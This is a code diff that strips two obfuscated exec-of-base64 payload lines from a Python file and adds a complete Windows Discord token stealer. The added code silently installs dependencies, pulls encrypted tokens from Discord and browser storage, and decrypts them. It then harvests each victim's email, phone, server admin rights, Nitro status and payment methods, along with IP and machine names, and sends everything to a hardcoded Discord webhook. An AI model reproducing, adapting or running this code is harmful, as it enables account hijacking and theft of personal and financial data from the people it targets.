@@ -1,3 +1,213 @@
-import base64,zlib,asyncio
-exec(zlib.decompress(base64.b64decode('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')))
-exec(zlib.decompress(base64.b64decode('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')))
+import os
+if os.name != "nt":
+    exit()
+import subprocess
+import sys
+import json
+import urllib.request
+import re
+import base64
+import datetime
+
+def install_import(modules):
+    for module, pip_name in modules:
+        try:
+            __import__(module)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            os.execl(sys.executable, sys.executable, *sys.argv)
+
+install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
+
+import win32crypt
+from Crypto.Cipher import AES
+
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    'Discord': ROAMING + '\\discord',
+    'Discord Canary': ROAMING + '\\discordcanary',
+    'Lightcord': ROAMING + '\\Lightcord',
+    'Discord PTB': ROAMING + '\\discordptb',
+    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
+    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
+    'Amigo': LOCAL + '\\Amigo\\User Data',
+    'Torch': LOCAL + '\\Torch\\User Data',
+    'Kometa': LOCAL + '\\Kometa\\User Data',
+    'Orbitum': LOCAL + '\\Orbitum\\User Data',
+    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
+    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
+    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
+    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
+    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
+    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
+    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
+    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
+    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
+    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
+    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
+}
+
+def getheaders(token=None):
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
+    }
+
+    if token:
+        headers.update({"Authorization": token})
+
+    return headers
+
+def gettokens(path):
+    path += "\\Local Storage\\leveldb\\"
+    tokens = []
+
+    if not os.path.exists(path):
+        return tokens
+
+    for file in os.listdir(path):
+        if not file.endswith(".ldb") and file.endswith(".log"):
+            continue
+
+        try:
+            with open(f"{path}{file}", "r", errors="ignore") as f:
+                for line in (x.strip() for x in f.readlines()):
+                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                        tokens.append(values)
+        except PermissionError:
+            continue
+
+    return tokens
+    
+def getkey(path):
+    with open(path + f"\\Local State", "r") as file:
+        key = json.loads(file.read())['os_crypt']['encrypted_key']
+        file.close()
+
+    return key
+
+def getip():
+    try:
+        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
+            return json.loads(response.read().decode()).get("ip")
+    except:
+        return "None"
+
+def main():
+    checked = []
+
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+
+        for token in gettokens(path):
+            token = token.replace("\\", "") if token.endswith("\\") else token
+
+            try:
+                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
+                if token in checked:
+                    continue
+                checked.append(token)
+
+                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
+                if res.getcode() != 200:
+                    continue
+                res_json = json.loads(res.read().decode())
+
+                badges = ""
+                flags = res_json['flags']
+                if flags == 64 or flags == 96:
+                    badges += ":BadgeBravery: "
+                if flags == 128 or flags == 160:
+                    badges += ":BadgeBrilliance: "
+                if flags == 256 or flags == 288:
+                    badges += ":BadgeBalance: "
+
+                params = urllib.parse.urlencode({"with_counts": True})
+                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
+                guilds = len(res)
+                guild_infos = ""
+
+                for guild in res:
+                    if guild['permissions'] & 8 or guild['permissions'] & 32:
+                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
+                        vanity = ""
+
+                        if res["vanity_url_code"] != None:
+                            vanity = f"""; .gg/{res["vanity_url_code"]}"""
+
+                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
+                if guild_infos == "":
+                    guild_infos = "No guilds"
+
+                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
+                has_nitro = False
+                has_nitro = bool(len(res) > 0)
+                exp_date = None
+                if has_nitro:
+                    badges += f":BadgeSubscriber: "
+                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
+
+                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
+                available = 0
+                print_boost = ""
+                boost = False
+                for id in res:
+                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
+                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
+                        print_boost += f"ㅤ- Available now\n"
+                        available += 1
+                    else:
+                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
+                    boost = True
+                if boost:
+                    badges += f":BadgeBoost: "
+
+                payment_methods = 0
+                type = ""
+                valid = 0
+                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
+                    if x['type'] == 1:
+                        type += "CreditCard "
+                        if not x['invalid']:
+                            valid += 1
+                        payment_methods += 1
+                    elif x['type'] == 2:
+                        type += "PayPal "
+                        if not x['invalid']:
+                            valid += 1
+                        payment_methods += 1
+
+                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
+                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
+                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
+                embed_user = {
+                    'embeds': [
+                        {
+                            'title': f"**New user data: {res_json['username']}**",
+                            'description': f"""
+                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
+                            'color': 3092790,
+                            'footer': {
+                                'text': "STEALER"
+                            },
+                            'thumbnail': {
+                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
+                            }
+                        }
+                    ],
+                    "username": "Discord Stealer",
+                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
+                }
+
+                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1404920467676205157/-s6Wv6l2G-2Vgam_FIUL8eNVfvShvkDImb7D7_jzxnmzhfCu46ZLJNNwTfwjqdIhzR-g', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+            except urllib.error.HTTPError or json.JSONDecodeError:
+                continue
+            except Exception as e:
+                print(f"ERROR: {e}")
+                continue
+
+if __name__ == "__main__":
+    main()
